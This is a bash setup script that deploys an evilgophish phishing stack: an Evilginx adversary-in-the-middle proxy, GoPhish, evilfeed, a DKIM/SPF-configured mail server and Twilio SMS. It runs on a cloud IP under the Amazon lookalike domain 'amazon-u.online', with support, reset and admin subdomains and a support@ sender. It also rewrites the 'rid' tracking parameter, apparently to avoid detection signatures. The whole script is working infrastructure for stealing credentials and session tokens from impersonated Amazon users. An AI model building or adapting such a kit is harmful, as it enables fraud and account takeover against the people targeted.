#!/bin/bash
# setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go and evilfeed.go; makes evilfeed optional; fixes mailconfig; cleans /tmp/evilgophish; adds Docker auth checks.
# SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
# Fixes: Checks src/gophish/gophish.go and src/evilfeed/evilfeed.go; retries DKIM with debug; skips evilfeed if directory missing; clarifies RID_REPLACEMENT; removes existing /tmp/evilgophish; ensures Docker Hub/GHCR auth.
# Usage: ./setup.sh
# Best Practices:
# - Edit .env.example before running; backup configs; secure secrets.
# - DNS: Lightsail zone; delegate from GoDaddy.
# - Mail: Generate DKIM; test with swaks; monitor deliverability.
# - Lightsail: Open ports; request port 25 removal.
# - Docker: Log in to Docker Hub and GHCR before running.

set -e

# Check Docker authentication
echo "Checking Docker Hub authentication..."
if ! docker info --format '{{.LoggedIn}}' | grep -q "true"; then
  echo "Docker Hub not authenticated. Please log in."
  echo "Run: docker login (use Docker Hub username/password or token)"
  echo "Create a free account at https://hub.docker.com if needed."
  exit 1
fi

echo "Checking GitHub Container Registry (GHCR) authentication..."
if ! docker pull ghcr.io/docker-mailserver/docker-mailserver:latest 2>/dev/null; then
  echo "GHCR authentication failed. Please log in."
  echo "Run: docker login ghcr.io -u YOUR_GITHUB_USERNAME -p YOUR_GITHUB_PAT"
  echo "Generate a PAT with 'read:packages' scope at https://github.com/settings/tokens"
  exit 1
fi

# Pre-pull base images
echo "Pulling base images..."
docker pull nginx:alpine
docker pull ghcr.io/docker-mailserver/docker-mailserver:latest

# Create .env.example if not exists
if [ ! -f .env.example ]; then
  cat > .env.example << EOF
# Environment variables for evilgophish
DOMAIN=amazon-u.online
SUBDOMAINS=support,email,reset,admin
PROXY_ROOT=true
FEED_ENABLED=true
RID_REPLACEMENT=user_id  # URL parameter for tracking users (e.g., ?user_id=abc123); change to 'id', 'token', etc. if needed
TWILIO_ACCOUNT_SID=your_twilio_account_sid
TWILIO_AUTH_TOKEN=your_twilio_auth_token
TWILIO_PHONE=+15551234567
TURNSTILE_PUBLIC=
TURNSTILE_PRIVATE=
SMTP_USER=support@amazon-u.online
SMTP_PASS=your_smtp_password
GOPHISH_DB_PATH=/app/data/gophish.db
SMTP_HOST=mailserver
SMTP_PORT=587
EOF
fi

# Copy .env.example to .env if .env doesn't exist
if [ ! -f .env ]; then
  cp .env.example .env
  echo "Created .env from .env.example. Edit .env with your credentials (TWILIO_*, SMTP_PASS, optionally RID_REPLACEMENT) and rerun."
  exit 1
fi

# Load .env
set -a
source .env
set +a

# Validate required inputs
[ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required in .env"; exit 1; }
[ -z "$TWILIO_ACCOUNT_SID" ] && { echo "Error: TWILIO_ACCOUNT_SID required in .env"; exit 1; }
[ -z "$TWILIO_AUTH_TOKEN" ] && { echo "Error: TWILIO_AUTH_TOKEN required in .env"; exit 1; }
[ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required in .env"; exit 1; }
[ -z "$RID_REPLACEMENT" ] && { echo "Error: RID_REPLACEMENT required in .env (e.g., user_id, id, token)"; exit 1; }

# Dirs/Files
mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
touch nginx.conf gophish/config.json ./mailconfig/postfix-main.cf
cp -n .env .env.bak || true
chmod -R 755 ./mailconfig  # Ensure writable for DKIM

# nginx.conf
cat > nginx.conf << 'EOF'
events { worker_connections 1024; }
http {
  log_format main '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"';
  access_log /var/log/nginx/access.log main;
  error_log /var/log/nginx/error.log warn;
  limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
  upstream evilginx { server evilginx:443; }
  server {
    listen 443 ssl http2;
    server_name _;
    ssl_certificate /etc/nginx/ssl/fullchain.pem;
    ssl_certificate_key /etc/nginx/ssl/privkey.pem;
    limit_req zone=mylimit burst=20;
    location / { proxy_pass https://evilginx/; proxy_set_header Host $host; proxy_ssl_verify off; }
  }
  server { listen 80; server_name _; return 301 https://$host$request_uri; }
}
EOF

# SSL
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout nginx/ssl/privkey.pem -out nginx/ssl/fullchain.pem -subj "/CN=$DOMAIN"

# gophish config
cat > gophish/config.json << EOF
{
  "admin_server": { "listen_url": "0.0.0.0:3333", "use_tls": false },
  "phish_server": { "listen_url": "127.0.0.1:8080", "use_tls": false },
  "db_name": "sqlite3",
  "db_path": "data/gophish.db"
}
EOF

# Mailserver postfix override
cat > mailconfig/postfix-main.cf << EOF
myhostname = mail.${DOMAIN}
mydomain = ${DOMAIN}
EOF

# DNS for local testing
HOSTS_ENTRY="127.0.0.1 $DOMAIN mail.$DOMAIN"
for sub in $SUBDOMAINS; do HOSTS_ENTRY="$HOSTS_ENTRY ${sub}.${DOMAIN}"; done
sudo cp /etc/hosts /etc/hosts.bak
echo "$HOSTS_ENTRY" | sudo tee -a /etc/hosts
echo "Local DNS set. For Lightsail DNS (see README):"
echo "- A: mail.$DOMAIN -> 3.147.37.21"
echo "- MX: @ -> mail.$DOMAIN (priority 10)"
echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"

# Clone separate repositories
mkdir -p src
echo "Cloning repositories..."
rm -rf src/evilginx3 src/gophish src/evilfeed
rm -rf /tmp/evilgophish  # Clean existing /tmp/evilgophish
if ! git clone https://github.com/kgretzky/evilginx2.git src/evilginx3; then
  echo "Error: Failed to clone evilginx2. Check network or repo access."
  exit 1
fi
if ! git clone https://github.com/gophish/gophish.git src/gophish; then
  echo "Error: Failed to clone gophish. Check network or repo access."
  exit 1
fi
if ! git clone https://github.com/fin3ss3g0d/evilgophish.git /tmp/evilgophish; then
  echo "Error: Failed to clone evilgophish for evilfeed. Check network or repo access."
  exit 1
fi
if [ -d "/tmp/evilgophish/evilfeed" ]; then
  cp -r /tmp/evilgophish/evilfeed src/evilfeed
else
  echo "Warning: evilfeed directory not found in evilgophish; skipping evilfeed setup."
fi
rm -rf /tmp/evilgophish

# Validate repositories
for dir in evilginx3 gophish; do
  [ ! -d "src/$dir" ] && { echo "Error: src/$dir missing after clone."; exit 1; }
  if [ "$dir" = "gophish" ]; then
    [ ! -f "src/$dir/gophish.go" ] && { echo "Error: src/$dir/gophish.go missing."; exit 1; }
  else
    [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
  fi
done
if [ -d "src/evilfeed" ]; then
  if [ ! -f "src/evilfeed/evilfeed.go" ]; then
    echo "Warning: src/evilfeed/evilfeed.go missing; evilfeed will not build."
  else
    echo "Evilfeed found with evilfeed.go; will build."
  fi
else
  echo "Warning: src/evilfeed directory missing; evilfeed will not build."
fi

# Fix permissions
sudo chown -R $(whoami):$(whoami) src
chmod -R 755 src

# RID replacement
echo "Replacing 'rid' with '$RID_REPLACEMENT' in source files..."
cd src
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec cp {} {}.bak \;
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec sed -i "s/rid/${RID_REPLACEMENT}/g" {} \;
cd ..

# Templates (only forbidden.html needed if no Turnstile)
cat > evilginx/templates/forbidden.html << 'EOF'
<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>
EOF

# Dockerfiles
cat > Dockerfile.gophish << 'EOF'
FROM golang:1.23-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/gophish .
RUN go mod download && CGO_ENABLED=0 go build -o /app/gophish ./gophish.go
FROM alpine:latest
RUN apk add --no-cache ca-certificates tzdata sqlite
WORKDIR /app
COPY --from=builder /app/gophish .
COPY gophish/config.json .
VOLUME /app/data /app/uploads /app/logs
EXPOSE 3333
CMD ["./gophish"]
EOF

cat > Dockerfile.evilginx << 'EOF'
FROM golang:1.23-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilginx3 .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilginx .
FROM alpine:latest
RUN apk add --no-cache ca-certificates iptables ip6tables
WORKDIR /app
COPY --from=builder /app/evilginx .
VOLUME /app /app/logs
EXPOSE 443
CMD ["./evilginx"]
EOF

cat > Dockerfile.evilfeed << 'EOF'
FROM golang:1.23-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilfeed .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilfeed ./evilfeed.go
FROM alpine:latest
WORKDIR /app
COPY --from=builder /app/evilfeed .
VOLUME /app/data /app/logs
EXPOSE 1337
CMD ["./evilfeed"]
EOF

# Start
docker compose up -d --build

# Mail setup (wait for mailserver to be healthy)
echo "Waiting for mailserver to be ready..."
sleep 30  # Increased delay for container startup
for i in {1..3}; do
  if docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"; then
    echo "Email user $SMTP_USER added successfully."
    break
  else
    echo "Attempt $i: Failed to add email user. Retrying..."
    docker logs mailserver | tail -n 20
    sleep 5
  fi
done
for i in {1..3}; do
  if docker exec -it mailserver setup config dkim; then
    echo "DKIM generated successfully."
    break
  else
    echo "Attempt $i: Failed to generate DKIM. Retrying..."
    docker logs mailserver | tail -n 20
    sleep 5
  fi
done
echo "DKIM generated. Add this TXT to Lightsail DNS:"
cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Error: DKIM not generated. Run: docker exec -it mailserver setup config dkim; docker logs mailserver"

# Post-setup
echo "Setup complete! Access:"
echo "- GoPhish Admin: http://localhost:3333 (default admin/gophish)"
echo "- Live Feed: http://localhost:1337 (if evilfeed built successfully)"
echo "- Phishing: https://$DOMAIN"
echo "- SMTP: Use in GoPhish: Host=mail.$DOMAIN:587, User=$SMTP_USER, Pass=****"
echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uploads/"
echo "Test SMTP: docker exec mailserver swaks -tls -au $SMTP_USER -ap '$SMTP_PASS' --from $SMTP_USER --to your@email.com --server localhost:587 -body 'Test'"
echo "DNS: Configure Lightsail (see README); GoDaddy NS to Lightsail."
echo "Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"
echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx3; ls src/gophish; ls src/evilfeed"